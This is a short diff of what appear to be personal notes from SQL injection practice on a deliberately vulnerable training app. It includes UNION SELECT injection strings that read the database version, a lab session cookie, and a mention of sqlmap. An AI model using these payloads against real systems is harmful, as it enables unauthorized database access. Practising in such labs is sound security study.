@@ -7,9 +7,9 @@ a' UNION SELECT "lol", @@VERSION ; -- -
 a' UNION SELECT "lol", @@VERSION ; -- #
 
 
- server 
+server 
 
  
- PHPSessid = f4rr8f8knoj0mog90l5p9d2ca9
+"security=low;PHPSESSID=g832d5mrsta7pm9c1hug0bj8io"
  
- sqlmap 
+sqlmap 
